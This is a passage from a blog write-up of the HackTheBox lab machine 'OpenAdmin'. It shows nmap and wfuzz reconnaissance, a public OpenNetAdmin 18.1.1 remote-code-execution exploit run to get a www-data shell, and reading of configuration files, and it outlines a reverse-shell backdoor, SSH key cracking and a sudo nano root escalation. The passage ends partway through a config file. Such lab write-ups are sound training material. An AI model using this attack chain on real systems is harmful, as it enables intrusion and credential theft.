<!DOCTYPE html>
<html lang=en>

<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/baffle.js/0.2.1/baffle.min.js"></script>
    <meta name="description" content="Quick Summary   → another easy box machine that you can easily find the exploit and get the shell with RCE or Remote Code Execution if you know how to do with the exploit. The second phase is to fin">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - OpenAdmin 📦">
<meta property="og:url" content="https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/index.html">
<meta property="og:site_name" content="❯ ＰＡＹＡＳ０">
<meta property="og:description" content="Quick Summary   → another easy box machine that you can easily find the exploit and get the shell with RCE or Remote Code Execution if you know how to do with the exploit. The second phase is to fin">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/open-admin.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/openA-apache-web.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/openA-music-page.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/openA-ona.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/openA-OpenNetAdmin.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/openA-nano.PNG">
<meta property="og:image" content="https://ph-payas0.github.io/img/openA/openA-root.png">
<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
<meta property="article:published_time" content="2020-05-03T07:43:47.000Z">
<meta property="article:modified_time" content="2020-06-09T21:38:38.906Z">
<meta property="article:author" content="Medz">
<meta property="article:tag" content="rce">
<meta property="article:tag" content="retired">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="GTFObins">
<meta property="article:tag" content="OpenNetAdmin">
<meta property="article:tag" content="mysql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ph-payas0.github.io/img/openA/open-admin.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon-1.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackTheBox - OpenAdmin 📦</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="❯ ＰＡＹＡＳ０" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020-05-29/HackTheBox/PenTesting/HackTheBox-Resolute/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020-04-18/HackTheBox/PenTesting/HackTheBox-Mango/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&text=HackTheBox - OpenAdmin 📦"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&is_video=false&description=HackTheBox - OpenAdmin 📦"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - OpenAdmin 📦&body=Check out this article: https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&name=HackTheBox - OpenAdmin 📦&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&t=HackTheBox - OpenAdmin 📦"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenAdmin-website"><span class="toc-number">4.1.</span> <span class="toc-text">OpenAdmin website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fuzzing"><span class="toc-number">4.2.</span> <span class="toc-text">Fuzzing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identify-vulnerabilities"><span class="toc-number">5.1.</span> <span class="toc-text">Identify vulnerabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-or-Remote-Code-Execution"><span class="toc-number">5.2.</span> <span class="toc-text">RCE or Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-web-configuration"><span class="toc-number">5.3.</span> <span class="toc-text">Enumerate web configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-a-proper-shell"><span class="toc-number">6.1.</span> <span class="toc-text">Get a proper shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-1"><span class="toc-number">7.1.</span> <span class="toc-text">Phase 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-2"><span class="toc-number">7.2.</span> <span class="toc-text">Phase 2</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
        <div class="content index py4">
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <embed src="/html/Kalimba.mp3" loop="true" autostart="true" width="2" height="0">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - OpenAdmin 📦
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">❯ ＰＡＹＡＳ０</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-05-03T07:43:47.000Z" itemprop="datePublished">03-05-2020</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/HackTheBox/PenTesting/">PenTesting</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/GTFObins/" rel="tag">GTFObins</a>, <a class="tag-link-link" href="/tags/OpenNetAdmin/" rel="tag">OpenNetAdmin</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/mysql/" rel="tag">mysql</a>, <a class="tag-link-link" href="/tags/rce/" rel="tag">rce</a>, <a class="tag-link-link" href="/tags/retired/" rel="tag">retired</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/img/openA/open-admin.png" alt="HackTheBox-OpenAdmin" title="Open Admin"></p>
<hr>
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → another easy box machine that you can easily find the exploit and get the shell with <strong>RCE</strong> or <strong>Remote Code Execution</strong> if you know how to do with the exploit. The second phase is to find user in <code>mysql database</code> base on the <code>database</code> configuration then login user as <em><code>Jimmy</code></em>. <code>user.txt</code> still cannot get on this phase so I need to the first privilege escalation to get the user <em><code>Joanna</code></em> by enumerating the website that is running on the machine. Then the <code>root</code> part is very simple. The user has a privilege root to run <em><code>nano</code></em> which can execute directly a shell.</p>
<hr>
<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
<li><p><strong>Network Scanning</strong></p>
<p>→ Nmap scan</p>
<p>→ discover open ports and what services are running</p>
</li>
<li><p><strong>Enumeration</strong></p>
<p>→ Browsing the HTTP Service</p>
<p>→ Fuzzing the webpage we get the page <code>music</code></p>
<p>→ Clicking on the login we get the page <code>/ona</code></p>
</li>
<li><p><strong>Post - Exploitation</strong></p>
<p>→ Identifies vulnerabilites</p>
<p>→ By clicking the <code>DOWNLOAD</code> button it’s redirect on <code>OpenNetAdmin</code> with version <code>v18.1.1</code></p>
<p>→ directly to google and search <code>opennetadmin v18.1.1 exploit</code> and it is <strong>RCE</strong> or <strong>Remote Code Execution</strong></p>
<p>→ run the bash script to get <strong><code>RCE</code></strong></p>
<p>→ enumerate the shell</p>
</li>
<li><p><strong>Exploitation</strong></p>
<p>→ send <code>php</code> backdoor to get <code>reverse shell</code></p>
<p>→ then run <strong><code>LinEnum</code></strong> to saved time in enumeration</p>
<p>→ found interesting configuration files at <code>/opt/ona/www/</code> directories which the website is installed.</p>
<p>→ found a <code>password</code> user for <code>jimmy</code></p>
</li>
<li><p><strong>Privilege Escalation</strong></p>
<p>→ <em>Phase 1</em></p>
<ul>
<li>get the user <code>joanna</code></li>
<li>we found internal websites which has a running at port <code>52846</code></li>
<li>running <code>curl</code> with the internal websites I get the <code>rsa key</code> of user <code>joanna</code></li>
<li>decrypt <code>rsa key</code> with <code>ssh2john</code></li>
<li>cracked the <code>rsa hash</code> with <code>john</code> to get the password</li>
<li>finally login as user <code>joanna</code> then get the <code>user.txt</code></li>
</ul>
<p>→ <em>Phase 2</em></p>
<ul>
<li>running <code>sudo -l</code> the user has given privileges by root to run nano.</li>
<li>by referrences from <code>GTFObins</code> I directly execute a shell which is a <code>root</code></li>
<li>then get the <code>root.txt</code></li>
</ul>
</li>
</ol>
<hr>
<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ I always begin at <em><strong>NMAP</strong></em> to look on the services what is running. I always use</p>
<hr>
<ul>
<li>-sV      ⇒ Probe open ports to determine service&#x2F;version info</li>
<li>-sC      ⇒ equivalent to —script&#x3D;default</li>
<li>-A-      ⇒ Agressive scan</li>
<li>-oN      ⇒ to save our scan results to a text file</li>
</ul>
<hr>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A -T4 10.10.10.171 -oN nmap-OpenAdmin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin </span><br><span class="line">❯ nmap -sV -sC -A 10.10.10.171 -oN nmap-OpenAdmin</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 02:22 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.171</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:98:<span class="built_in">df</span>:85:d1:7e:f0:3d:da:48:<span class="built_in">cd</span>:bc:92:00:b7:54 (RSA)</span><br><span class="line">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)</span><br><span class="line">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.13 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (93%), Linux 3.8 (92%), Android 4.1.2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   202.97 ms 10.10.14.1</span><br><span class="line">2   204.23 ms 10.10.10.171</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 128.52 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin took 2m8s </span><br><span class="line">❯</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there’s only 2 port open.</p>
<ul>
<li>22       ⇒ which basically a <code>SSH</code></li>
<li>80	   ⇒ which running <code>HTTP Service</code> or a <code>website</code></li>
</ul>
<hr>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="OpenAdmin-website"><a href="#OpenAdmin-website" class="headerlink" title="OpenAdmin website"></a>OpenAdmin website</h3><p>as always i first enumerate a machine if it is running a website. Visiting the page I get a default page of <code>Apache</code></p>
<p><img src="/img/openA/openA-apache-web.png" alt="HackTheBox-OpenAdmin" title="Open Admin Home page"></p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>I tried to run my favorite bruteforce directory tool <code>dirsearch</code> but it takes so much time. So I tried to fuzz the website as my second option with<code>directory-list-2.3-medium.txt</code> wordlists so :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin </span><br><span class="line">❯ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404,403,400 http://10.10.10.171/FUZZ</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.10.10.171/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 220560</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000001:   200        375 L    964 W    10918 Ch    &quot;# directory-list-2.3-medium.txt&quot;                                                                                         </span></span><br><span class="line"><span class="string">000000002:   200        375 L    964 W    10918 Ch    &quot;#&quot;                                                                                                                       </span></span><br><span class="line"><span class="string">000000004:   200        375 L    964 W    10918 Ch    &quot;#&quot;                                                                                                                       </span></span><br><span class="line"><span class="string">000000006:   200        375 L    964 W    10918 Ch    &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                                                           </span></span><br><span class="line"><span class="string">000000007:   200        375 L    964 W    10918 Ch    &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                                                         </span></span><br><span class="line"><span class="string">000000009:   200        375 L    964 W    10918 Ch    &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                                                                     </span></span><br><span class="line"><span class="string">000000003:   200        375 L    964 W    10918 Ch    &quot;# Copyright 2007 James Fisher&quot;                                                                                           </span></span><br><span class="line"><span class="string">000000010:   200        375 L    964 W    10918 Ch    &quot;#&quot;                                                                                                                       </span></span><br><span class="line"><span class="string">000000005:   200        375 L    964 W    10918 Ch    &quot;# This work is licensed under the Creative Commons&quot;                                                                      </span></span><br><span class="line"><span class="string">000000008:   200        375 L    964 W    10918 Ch    &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                                                              </span></span><br><span class="line"><span class="string">000000011:   200        375 L    964 W    10918 Ch    &quot;# Priority ordered case sensative list, where entries were found&quot;                                                        </span></span><br><span class="line"><span class="string">000000012:   200        375 L    964 W    10918 Ch    &quot;# on atleast 2 different hosts&quot;                                                                                          </span></span><br><span class="line"><span class="string">000000013:   200        375 L    964 W    10918 Ch    &quot;#&quot;                                                                                                                       </span></span><br><span class="line"><span class="string">000000014:   200        375 L    964 W    10918 Ch    &quot;&quot;                                                                                                                        </span></span><br><span class="line"><span class="string">000000172:   301        9 L      28 W     312 Ch      &quot;music&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000005045:   301        9 L      28 W     314 Ch      &quot;artwork&quot;                                                                                                                 </span></span><br><span class="line"><span class="string">000044892:   301        9 L      28 W     313 Ch      &quot;sierra&quot;                                                                                                                  </span></span><br><span class="line"><span class="string">000045240:   200        375 L    964 W    10918 Ch    &quot;&quot;                                                                                                                        </span></span><br><span class="line"><span class="string">000146283:   404        9 L      31 W     274 Ch      &quot;103425&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/OpenAdmin took 8m47s </span></span><br><span class="line"><span class="string">❯</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>I get the directory page <code>music</code> but it seems there’s no interesting stuffs here :</p>
<p><img src="/img/openA/openA-music-page.png" alt="HackTheBox-OpenAdmin" title="Open Admin Home page"></p>
<hr>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Identify-vulnerabilities"><a href="#Identify-vulnerabilities" class="headerlink" title="Identify vulnerabilities"></a>Identify vulnerabilities</h3><p>if you clicked on <code>Login</code> button it’s redirect to page <code>/ona</code> which did not appearch on my fuzz.</p>
<p><img src="/img/openA/openA-ona.png" alt="HackTheBox-OpenAdmin" title="Open Admin ona"></p>
<p>As you can see it’s look like a web configuration probably for networks and dns. also the page gave me a hint because if you look the site it is running on a outdate version <code>v18.1.1</code>, I clicked on the download page it is redirect me to <code>OpenNetAdmin</code> site.</p>
<p><img src="/img/openA/openA-OpenNetAdmin.png" alt="HackTheBox-OpenAdmin" title="Open Net Admin"></p>
<p>So I finally know what to do, directly search to google <code>opennetadmin v18.1.1 exploit</code> and there was on <code>ExploitDB</code> written in bash.</p>
<h3 id="RCE-or-Remote-Code-Execution"><a href="#RCE-or-Remote-Code-Execution" class="headerlink" title="RCE or Remote Code Execution"></a>RCE or Remote Code Execution</h3><p>I run exploit to get the shell of <code>www-data</code> but i have not proper shell :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin </span><br><span class="line">❯ bash exploit.sh http://10.10.10.171/ona/</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/opt/ona/www</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>when I tried to enumate the site’ the only thing i found interesting is the <code>config</code> directory :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -l /opt/ona/www</span><br><span class="line">total 68</span><br><span class="line">drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 config</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1949 Jan  3  2018 config_dnld.php</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 4160 Jan  3  2018 dcm.php</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 May  3 19:42 i</span><br><span class="line">-rw-r--r-- 1 www-data www-data  216 May  3 17:33 i.py</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 images</span><br><span class="line">drwxrwxr-x 9 www-data www-data 4096 Jan  3  2018 include</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1999 Jan  3  2018 index.php</span><br><span class="line">drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 <span class="built_in">local</span></span><br><span class="line">-rw-rw-r-- 1 www-data www-data 4526 Jan  3  2018 login.php</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1106 Jan  3  2018 logout.php</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 modules</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 plugins</span><br><span class="line">drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 winc</span><br><span class="line">drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 workspace_plugins</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>trying to list what’s on the <code>config</code> directory</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -l /opt/ona/www/config</span><br><span class="line">total 16</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 1905 Jan  3  2018 auth_ldap.config.php</span><br><span class="line">-rw-rw-r-- 1 www-data www-data 9983 Jan  3  2018 config.inc.php</span><br><span class="line">$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Enumerate-web-configuration"><a href="#Enumerate-web-configuration" class="headerlink" title="Enumerate web configuration"></a>Enumerate web configuration</h3><p>I trying first at the <code>config.inc.php</code> and I found a configuration of <code>database</code> file.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ cat /opt/ona/www/config/config.inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////   WARNING   /////////////////////////////</span></span><br><span class="line"><span class="comment">//           This is the site configuration file.              //</span></span><br><span class="line"><span class="comment">//                                                             //</span></span><br><span class="line"><span class="comment">//      It is not intended that this file be edited.  Any      //</span></span><br><span class="line"><span class="comment">//      user configurations should be in the local config or   //</span></span><br><span class="line"><span class="comment">//      in the database table sys_config                       //</span></span><br><span class="line"><span class="comment">//                                                             //</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Used in PHP for include files and such</span></span><br><span class="line"><span class="comment">// Prefix.. each .php file should have already set $base and $include</span></span><br><span class="line"><span class="comment">// if it is written correctly.  We assume that is the case.</span></span><br><span class="line"><span class="variable">$base</span>;</span><br><span class="line"><span class="variable">$include</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$onabase</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$base</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$baseURL = preg_replace(&#x27;+&#x27; . dirname($_SERVER[&#x27;DOCUMENT_ROOT&#x27;]) . &#x27;+&#x27;, &#x27;&#x27;, $base);</span></span><br><span class="line"><span class="comment">//$baseURL = preg_replace(&#x27;+/$+&#x27;, &#x27;&#x27;, $baseURL);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Used in URL links</span></span><br><span class="line"><span class="variable">$baseURL</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]); <span class="variable">$baseURL</span> = <span class="title function_ invoke__">rtrim</span>(<span class="variable">$baseURL</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$images</span> = <span class="string">&quot;<span class="subst">&#123;$baseURL&#125;</span>/images&quot;</span>;</span><br><span class="line"></span><br><span 